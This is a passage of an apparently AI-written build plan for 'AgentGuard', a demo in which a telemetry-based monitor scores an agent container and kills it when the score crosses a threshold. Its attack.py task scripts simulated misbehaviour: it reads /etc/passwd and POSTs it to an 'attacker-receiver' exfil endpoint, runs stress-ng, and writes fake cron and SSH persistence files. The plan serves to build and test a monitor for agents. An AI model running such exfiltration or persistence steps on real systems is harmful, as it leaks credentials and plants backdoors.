            await asyncio.sleep(self.cfg.tick_sec)
            # Pull latest telemetry window
            async with httpx.AsyncClient(timeout=5) as c:
                r = await c.get(f"{self.cfg.telemetry_url}/window")
                win = np.array(r.json()["data"], dtype=np.float32)
            # Re-seed buffer from the collector (it IS the authoritative slider)
            run.s1 = Stream1Buffer.from_baseline(win)
            s1 = run.s1.current()
            s2, mask = run.s2.current()
            run.score = self.scorer.score(s1, s2, mask)
            over = run.score > self.cfg.threshold
            run.over_count = run.over_count + 1 if over else 0
            run.status = "SUSPICIOUS" if over else ("MONITORING" if run.status != "SUSPICIOUS" else "MONITORING")
            if run.over_count >= 2:
                run.status = "KILLED"
                run.worker.kill()
                await self.bc.publish(run.run_id, {"type": "status", "status": "KILLED", "score": run.score})
                break
            # Check worker still alive
            run.worker.container.reload()
            if run.worker.container.status == "exited":
                run.status = "COMPLETED"
                await self.bc.publish(run.run_id, {"type": "status", "status": "COMPLETED", "score": run.score})
                break
            await self.bc.publish(run.run_id, {
                "type": "tick", "score": run.score, "status": run.status,
                "stream1_last": s1[-1].tolist(),
            })

    async def ingest_event(self, run_id: str, vec_28: list[float], raw_log_line: str):
        run = self.runs.get(run_id)
        if not run: return
        run.s2.push(np.array(vec_28, dtype=np.float32))
        await self.bc.publish(run_id, {"type": "log", "line": raw_log_line})
```

- [ ] **Step 3: Implement `main.py`**

```python
# demo/control_plane/app/main.py
import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
from .config import Config
from .sse import Broadcaster, sse_format
from .runs import RunManager

cfg = Config()
bc = Broadcaster()
rm = RunManager(cfg, bc)
app = FastAPI()

class RunReq(BaseModel):
    prompt: str

class EventReq(BaseModel):
    run_id: str
    vec: list[float]
    log: str

@app.get("/health")
async def health(): return {"ok": True}

@app.post("/run")
async def start_run(req: RunReq):
    rid = await rm.start_run(req.prompt)
    return {"run_id": rid}

@app.post("/events")          # worker posts encoded 28-dim vectors here
async def ingest(e: EventReq):
    await rm.ingest_event(e.run_id, e.vec, e.log)
    return {"ok": True}

@app.get("/runs/{run_id}/stream")
async def stream(run_id: str, request: Request):
    q = bc.subscribe(run_id)
    async def gen():
        try:
            while not await request.is_disconnected():
                try:
                    evt = await asyncio.wait_for(q.get(), timeout=15)
                    yield sse_format(evt)
                except asyncio.TimeoutError:
                    yield sse_format({"type": "heartbeat"})
        finally:
            bc.unsubscribe(run_id, q)
    return StreamingResponse(gen(), media_type="text/event-stream")
```

- [ ] **Step 4: Wire into `demo/docker-compose.yml`**, replacing busybox stub. Mount `/var/run/docker.sock:/var/run/docker.sock:ro` (or rw — `docker kill` needs write). Mount `./shared:/app/shared:ro`.

- [ ] **Step 5: Commit.**

---

### Phase 4 — Agent worker + attacker receiver (subagent C)

**Files:**
- Create: `demo/agent_worker/Dockerfile`
- Create: `demo/agent_worker/pyproject.toml`
- Create: `demo/agent_worker/app/{main,router,events}.py`
- Create: `demo/agent_worker/app/behaviors/{__init__,benign,attack}.py`
- Create: `demo/agent_worker/fixtures/notes.txt`
- Create: `demo/agent_worker/tests/test_{router,events}.py`
- Create: `demo/attacker_receiver/{Dockerfile,app.py}`

#### Task 4.1: `events.py` — action event emitter matching Stream 2's 28-dim encoding

- [ ] **Step 1: Read `data/preprocessing.py` carefully** to find the Stream 2 event encoder (the function that turns an event dict into a 28-dim vector). Name that function in a comment.

- [ ] **Step 2: Test**

```python
# demo/agent_worker/tests/test_events.py
from app.events import encode_event
def test_tool_call_encoding():
    v = encode_event({"type": "tool_call", "tool": "read_file",
                      "latency_ms": 100, "tokens_in": 50, "tokens_out": 0,
                      "user_initiated": False, "dt_prev_ms": 200,
                      "external_source": False, "has_tool_calls": True})
    assert len(v) == 28 and all(isinstance(x, float) for x in v)
```

- [ ] **Step 3: Implement `events.py`** — thin wrapper over the repo's encoder, plus an HTTP client to POST the encoded vector to `control-plane:8000/events` along with a human-readable log line.

```python
# demo/agent_worker/app/events.py
from __future__ import annotations
import os, sys, time, httpx
sys.path.insert(0, "/workspace")
from data.preprocessing import encode_stream2_event   # <-- confirm exact name

CONTROL = os.environ.get("CONTROL_PLANE", "http://control-plane:8000")

def encode_event(evt: dict) -> list[float]:
    return list(map(float, encode_stream2_event(evt)))

async def emit(run_id: str, evt: dict, log_line: str) -> None:
    async with httpx.AsyncClient(timeout=5) as c:
        await c.post(f"{CONTROL}/events",
                     json={"run_id": run_id, "vec": encode_event(evt), "log": log_line})
```

- [ ] **Step 4: If `encode_stream2_event` isn't the real symbol name**, wire whichever function in `data/preprocessing.py` performs the Stream 2 per-event encoding. Add a module-docstring comment naming it.

- [ ] **Step 5: Commit.**

#### Task 4.2: `behaviors/benign.py`

- [ ] **Step 1: Implement all four benign behaviors, each an `async def run(run_id, prompt)`** that:
  - Emits `user_message` event for the prompt
  - Performs one or two real tool calls (read_file, web_search, list_directory)
  - Emits matching `tool_call` + `tool_result` events
  - Emits `llm_response` with a canned short string
  - Returns

```python
# demo/agent_worker/app/behaviors/benign.py
import asyncio, time, os, httpx
from pathlib import Path
from ..events import emit

async def summarize(run_id, prompt):
    t0 = time.time()
    await emit(run_id, {"type":"user_message","tokens_in":len(prompt.split()),"tokens_out":0,
                        "user_initiated":True,"dt_prev_ms":0}, f"USER> {prompt}")
    data = Path("/app/fixtures/notes.txt").read_text()
    await emit(run_id, {"type":"tool_call","tool":"read_file","latency_ms":0,
                        "tokens_in":0,"tokens_out":0,"user_initiated":False,
                        "dt_prev_ms":10,"has_tool_calls":True},
               "TOOL> read_file(/app/fixtures/notes.txt)")
    await emit(run_id, {"type":"tool_result","tool":"read_file","latency_ms":5,
                        "tokens_in":len(data.split()),"tokens_out":0,
                        "user_initiated":False,"dt_prev_ms":5},
               f"RES> {len(data)} bytes")
    await emit(run_id, {"type":"llm_response","tokens_out":30,
                        "user_initiated":False,"dt_prev_ms":150},
               "LLM> Summary: ...")

async def search(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    await emit(run_id, {"type":"tool_call","tool":"web_search",
                        "has_tool_calls":True,"external_source":True},
               "TOOL> web_search")
    async with httpx.AsyncClient(timeout=5) as c:
        try:
            await c.get("https://api.duckduckgo.com/?q=demo&format=json")
        except Exception: pass
    await emit(run_id, {"type":"tool_result","tool":"web_search","external_source":True},
               "RES> 3 results")
    await emit(run_id, {"type":"llm_response"}, "LLM> Here are 3 results...")

async def calculate(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    # tiny CPU blip
    x = 0
    for i in range(200_000): x += i
    await emit(run_id, {"type":"llm_response"}, f"LLM> = {x}")

async def list_files(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    await emit(run_id, {"type":"tool_call","tool":"list_directory","has_tool_calls":True},
               "TOOL> list_directory(/app/fixtures)")
    files = os.listdir("/app/fixtures")
    await emit(run_id, {"type":"tool_result","tool":"list_directory"}, f"RES> {files}")
    await emit(run_id, {"type":"llm_response"}, "LLM> Files: ...")
```

- [ ] **Step 2: Commit.**

#### Task 4.3: `behaviors/attack.py`

```python
# demo/agent_worker/app/behaviors/attack.py
import asyncio, os, subprocess, httpx
from pathlib import Path
from ..events import emit

async def resource_abuse(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    await emit(run_id, {"type":"tool_call","tool":"run_command","has_tool_calls":True},
               "TOOL> run_command(stress-ng --cpu 4 --timeout 60s)")
    # Spawn stress-ng in background so the /execute call returns fast
    subprocess.Popen(["stress-ng", "--cpu", "4", "--timeout", "60s"])

async def exfiltration(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    data = Path("/etc/passwd").read_text()
    await emit(run_id, {"type":"tool_call","tool":"read_file","has_tool_calls":True},
               "TOOL> read_file(/etc/passwd)")
    await emit(run_id, {"type":"tool_result","tool":"read_file"}, f"RES> {len(data)}B")
    async with httpx.AsyncClient(timeout=5) as c:
        await c.post("http://attacker-receiver:9090/exfil", content=data)
    await emit(run_id, {"type":"tool_call","tool":"web_request",
                        "has_tool_calls":True,"external_source":True},
               "TOOL> web_request(attacker-receiver:9090/exfil, POST)")

async def persistence(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    for f in ["/tmp/.fake_cron", "/tmp/.fake_ssh_authorized_keys"]:
        Path(f).write_text("demo-marker\n")
        await emit(run_id, {"type":"tool_call","tool":"write_file","has_tool_calls":True},
                   f"TOOL> write_file({f})")

async def tool_chaining(run_id, prompt):
    await emit(run_id, {"type":"user_message","user_initiated":True}, f"USER> {prompt}")
    for i in range(25):
        await emit(run_id, {"type":"tool_call","tool":"list_directory","has_tool_calls":True},
                   f"TOOL> list_directory iter={i}")
        os.listdir("/")
        await emit(run_id, {"type":"tool_call","tool":"web_request",
                            "has_tool_calls":True,"external_source":True},
                   f"TOOL> web_request iter={i}")
        try:
            async with httpx.AsyncClient(timeout=2) as c:
                await c.get("https://example.com")
        except Exception: pass
```

- [ ] **Step 2: Commit.**

#### Task 4.4: `router.py` + `main.py`

```python
# demo/agent_worker/app/router.py
from .behaviors import benign, attack

BEHAVIORS = [
    ("resource_abuse", ["stress", "cpu", "mine", "crypto", "fork bomb"], attack.resource_abuse),
    ("exfiltration",   ["exfil", "passwd", "shadow", "leak"],             attack.exfiltration),
    ("persistence",    ["persist", "cron", "ssh key", "backdoor"],        attack.persistence),
    ("tool_chaining",  ["chain", "loop", "hijack"],                       attack.tool_chaining),
    ("summarize",      ["summarize", "summary", "notes"],                 benign.summarize),
    ("search",         ["search", "google", "look up"],                   benign.search),
    ("list_files",     ["list", "ls ", "directory", "files"],             benign.list_files),
    ("calculate",      ["calculate", "math", "compute", "+", "="],        benign.calculate),
]
FALLBACK = benign.calculate

def route(prompt: str):
    p = prompt.lower()
    for name, kws, fn in BEHAVIORS:
        if any(k in p for k in kws):
            return name, fn
    return "calculate", FALLBACK
```

```python
# demo/agent_worker/app/main.py
import asyncio
from fastapi import FastAPI
from pydantic import BaseModel
from .router import route

app = FastAPI()

class Req(BaseModel):
    run_id: str
    prompt: str

@app.post("/execute")
async def execute(r: Req):
    name, fn = route(r.prompt)
    asyncio.create_task(fn(r.run_id, r.prompt))
    return {"behavior": name}

@app.get("/health")
async def h(): return {"ok": True}
```

- [ ] **Step 2: Dockerfile**

```dockerfile
# demo/agent_worker/Dockerfile
FROM python:3.11-slim
RUN apt-get update && apt-get install -y --no-install-recommends stress-ng curl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY demo/agent_worker/pyproject.toml .
RUN pip install --no-cache-dir fastapi uvicorn[standard] httpx numpy
COPY . /workspace
ENV PYTHONPATH=/workspace
COPY demo/agent_worker/ /app/
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8200"]
```

- [ ] **Step 3: Commit.**

#### Task 4.5: `attacker_receiver`

```python
# demo/attacker_receiver/app.py
from flask import Flask, request
app = Flask(__name__)

@app.post("/exfil")
def exfil():
    body = request.get_data(as_text=True)
    print(f"POST /exfil len={len(body)}", flush=True)
    return {"ok": True}

@app.get("/health")
def h(): return {"ok": True}
```

```dockerfile
# demo/attacker_receiver/Dockerfile
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir flask
COPY demo/attacker_receiver/app.py .
CMD ["python", "-m", "flask", "--app", "app", "run", "--host=0.0.0.0", "--port=9090"]
```

- [ ] **Commit.**

---

### Phase 5 — Frontend (subagent D)

**Files:** everything under `demo/frontend/`.

#### Task 5.1: Next.js + Tailwind + shadcn scaffold

- [ ] **Step 1: Scaffold** (inside `demo/frontend`):

```bash
cd demo/frontend
npx create-next-app@latest . --ts --tailwind --eslint --app --src-dir=false --import-alias="@/*" --no-git
npx shadcn@latest init -y
npx shadcn@latest add button input card badge scroll-area separator sonner
npm install recharts
```

- [ ] **Step 2: Commit scaffold.**

#### Task 5.2: `lib/types.ts` and `lib/api.ts`

- [ ] **Step 1: `lib/types.ts`**

```typescript
export type Status = "MONITORING" | "SUSPICIOUS" | "KILLED" | "COMPLETED";

export type TickEvent = {
  type: "tick";
  score: number;
  status: Status;
  stream1_last: number[]; // length 32; indices 0..3 are CPU stats
};
export type LogEvent = { type: "log"; line: string };
export type StatusEvent = { type: "status"; status: Status; score: number };
export type HeartbeatEvent = { type: "heartbeat" };
export type DemoEvent = TickEvent | LogEvent | StatusEvent | HeartbeatEvent;
```

- [ ] **Step 2: `lib/api.ts`**

```typescript
export const API = process.env.NEXT_PUBLIC_CONTROL_PLANE ?? "http://localhost:8000";

export async function postRun(prompt: string): Promise<{ run_id: string }> {
  const r = await fetch(`${API}/run`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ prompt }),
  });
  if (!r.ok) throw new Error(`postRun ${r.status}`);
  return r.json();
}

export function subscribeStream(runId: string, onEvent: (e: unknown) => void): EventSource {
  const es = new EventSource(`${API}/runs/${runId}/stream`);
  es.onmessage = (m) => onEvent(JSON.parse(m.data));
  return es;
}
```

- [ ] **Step 3: Commit.**

#### Task 5.3: Components

- [ ] **`prompt-bar.tsx`** — shadcn `Input` + `Button` + a chip row of the 8 canned prompts:

```tsx
// demo/frontend/components/prompt-bar.tsx
"use client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useState } from "react";

const CHIPS = [
  "Summarize my notes", "Search for the weather", "Calculate 12*7", "List files",
  "Stress the cpu", "Exfiltrate /etc/passwd", "Install a cron backdoor", "Chain 20 tools",
];

export function PromptBar({ disabled, onSubmit }: { disabled: boolean; onSubmit: (p: string) => void }) {
  const [v, setV] = useState("");
  return (
    <div className="flex flex-col gap-3">
      <div className="flex gap-2">
        <Input value={v} onChange={(e) => setV(e.target.value)}
               placeholder="Ask the agent..." disabled={disabled} />
        <Button disabled={disabled || !v} onClick={() => onSubmit(v)}>Run</Button>
      </div>
      <div className="flex flex-wrap gap-2">
        {CHIPS.map((c) => (
          <Button key={c} variant="secondary" size="sm" disabled={disabled}
                  onClick={() => onSubmit(c)}>{c}</Button>
        ))}
      </div>
    </div>
  );
}
```

- [ ] **`score-chart.tsx`** — Recharts `LineChart` with a reference line at `threshold`, red-shaded area above. Accepts `data: { t: number; score: number }[]`, `threshold: number`.

- [ ] **`status-badge.tsx`** — shadcn `Badge` with variants: default for `MONITORING`, `warning`-styled for `SUSPICIOUS`, `destructive` for `KILLED`, `secondary`/green for `COMPLETED`.

- [ ] **`telemetry.tsx`** — three small cards, each a Recharts sparkline of CPU / memory / net (pulled from `tick.stream1_last[0]`, `[4]`, `[12]` — exact indices come from `data/preprocessing.py` column order; verify indices during implementation).

- [ ] **`action-log.tsx`** — shadcn `ScrollArea` containing `<pre>` lines, auto-scrolled to bottom on new line.

- [ ] **Commit each component when complete.**

#### Task 5.4: `app/page.tsx` — four-region layout

```tsx
// demo/frontend/app/page.tsx
"use client";
import { useRef, useState } from "react";
import { PromptBar } from "@/components/prompt-bar";
import { ScoreChart } from "@/components/score-chart";
import { StatusBadge } from "@/components/status-badge";
import { Telemetry } from "@/components/telemetry";
import { ActionLog } from "@/components/action-log";
import { postRun, subscribeStream } from "@/lib/api";
import type { DemoEvent, Status } from "@/lib/types";

const THRESHOLD = 0.5;

export default function Page() {
  const [scores, setScores] = useState<{ t: number; score: number }[]>([]);
  const [logs, setLogs] = useState<string[]>([]);
  const [status, setStatus] = useState<Status>("MONITORING");
  const [running, setRunning] = useState(false);
  const [telemetry, setTelemetry] = useState<{ cpu: number; mem: number; net: number }[]>([]);
  const esRef = useRef<EventSource | null>(null);

  const onSubmit = async (prompt: string) => {
    reset();
    setRunning(true);
    const { run_id } = await postRun(prompt);
    esRef.current = subscribeStream(run_id, (evt: DemoEvent) => {
      if (evt.type === "tick") {
        setScores((s) => [...s, { t: Date.now(), score: evt.score }]);
        setStatus(evt.status);
        setTelemetry((t) => [...t, {
          cpu: evt.stream1_last[0], mem: evt.stream1_last[4], net: evt.stream1_last[12],
        }]);
      } else if (evt.type === "log") {
        setLogs((l) => [...l, evt.line]);
      } else if (evt.type === "status") {
        setStatus(evt.status);
        setRunning(false);
        esRef.current?.close();
      }
    });
  };

  const reset = () => {
    esRef.current?.close();
    setScores([]); setLogs([]); setStatus("MONITORING"); setTelemetry([]); setRunning(false);
  };

  return (
    <main className="p-6 grid gap-4" style={{ gridTemplateColumns: "2fr 1fr", gridTemplateRows: "auto 1fr 1fr" }}>
      <div style={{ gridColumn: "1 / 3" }}>
        <PromptBar disabled={running} onSubmit={onSubmit} />
      </div>
      <div style={{ gridRow: "2 / 4" }}>
        <ScoreChart data={scores} threshold={THRESHOLD} />
      </div>
      <div>
        <StatusBadge status={status} />
        <Telemetry data={telemetry} />
      </div>
      <div>
        <ActionLog lines={logs} />
        <button onClick={reset} className="mt-2 text-xs underline">Reset</button>
      </div>
    </main>
  );
}
```

- [ ] **Commit.**

#### Task 5.5: Dockerfile + compose wiring

```dockerfile
# demo/frontend/Dockerfile
FROM node:20-alpine AS build
WORKDIR /app
COPY demo/frontend/package*.json ./
RUN npm ci
COPY demo/frontend/ .
RUN npm run build

FROM node:20-alpine
WORKDIR /app
COPY --from=build /app .
ENV NODE_ENV=production
EXPOSE 3000
CMD ["npm", "run", "start"]
```

- [ ] **Add env** `NEXT_PUBLIC_CONTROL_PLANE=http://localhost:8000` in compose.

- [ ] **Commit.**

---

### Phase 6 — End-to-end verification (sequential, main session)

#### Task 6.1: Compose wiring review

- [ ] Update `demo/docker-compose.yml` to replace all busybox stubs with the real services:

```yaml
services:
  frontend:
    build: { context: ../, dockerfile: demo/frontend/Dockerfile }
    ports: ["3000:3000"]
    environment: { NEXT_PUBLIC_CONTROL_PLANE: "http://localhost:8000" }
  control-plane:
    build: { context: ../, dockerfile: demo/control_plane/Dockerfile }
    ports: ["8000:8000"]
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ./shared:/app/shared:ro
    environment:
      AGENTGUARD_THRESHOLD: "${AGENTGUARD_THRESHOLD:-0.5}"
      AGENTGUARD_WORKER_IMAGE: "agentguard-agent-worker:latest"
      AGENTGUARD_NETWORK: "agentguard-demo-net"
  agent-worker-template:
    build: { context: ../, dockerfile: demo/agent_worker/Dockerfile }
    image: agentguard-agent-worker:latest
    command: ["sh", "-c", "echo 'template image only; real workers are spawned per-run by control-plane' && sleep infinity"]
  telemetry-collector:
    build: { context: ../, dockerfile: demo/telemetry_collector/Dockerfile }
    pid: "host"
    volumes: ["/proc:/host/proc:ro"]
  attacker-receiver:
    build: { context: ../, dockerfile: demo/attacker_receiver/Dockerfile }
networks:
  default:
    name: agentguard-demo-net
```

#### Task 6.2: Acceptance tests

- [ ] `docker compose up --build -d` — wait for all services healthy.
- [ ] Benign suite — 4 prompts, each must end `status=COMPLETED`, never cross threshold.
- [ ] Attack suite — 4 prompts, each must end `status=KILLED` within 60 s; verify:
  - `docker ps -a --filter "name=agent-worker-"` shows the worker is gone or exited.
  - `docker compose logs attacker-receiver | grep 'POST /exfil'` after exfil run.
  - `/tmp/.fake_cron` marker exists inside the worker filesystem before kill (use `docker logs` on the worker's stdout for the write_file confirmation).
- [ ] Manual UI pass — each chip once; observe score climb/stay flat, badge flip.
- [ ] No container leaks: `docker ps -a --filter "name=agent-worker-"` empty between runs.

#### Task 6.3: README

- [ ] Update `demo/README.md` with (a) `docker compose up --build`, (b) open `http://localhost:3000`, (c) the 8 example chips, (d) how to tune threshold via `AGENTGUARD_THRESHOLD` env var, (e) troubleshooting: if the first run times out at 30 s, baseline is bad — re-run `capture_baseline.py`.

- [ ] Commit.

---

## Self-review

**Spec coverage:** Each decision table row in the approved plan has a matching task — attack realism (4.3), scripted routing (4.4), 30 s windows / 5 s tick (3.5 tick loop), pre-seeded baseline (3.1, 2.4), 2-tick debounce (3.5 `over_count`). Each of the 4 benign and 4 attack behaviors has an implementation. All 5 services are wired in 6.1.

**Placeholder scan:** No TBDs. Two explicit "confirm the exact symbol name from `data/preprocessing.py`" notes (Task 2.2 Step 4, Task 4.1 Step 1, Task 4.1 Step 4) are acknowledged unknowns the executor must resolve by reading the file — not plan gaps.

**Type consistency:**
- `Status` enum: `MONITORING | SUSPICIOUS | KILLED | COMPLETED` used consistently in both backend (`runs.py`) and frontend (`lib/types.ts`).
- `Stream1Buffer` shape `(8, 32)`, `Stream2Buffer` shape `(64, 28)` — consistent everywhere.
- `tick` event fields (`type, score, status, stream1_last`) — publisher (`runs.py::_run_loop`) matches consumer (`page.tsx`).
- Control-plane endpoints: `POST /run`, `POST /events`, `GET /runs/{id}/stream` — frontend, worker, and control-plane all use these exact paths.

---

## Execution handoff

Plan complete and saved to `docs/superpowers/plans/2026-04-23-agentguard-demo.md`. Proceeding with **Subagent-Driven execution** (user explicitly requested `/subagent-driven-development` and parallel work).
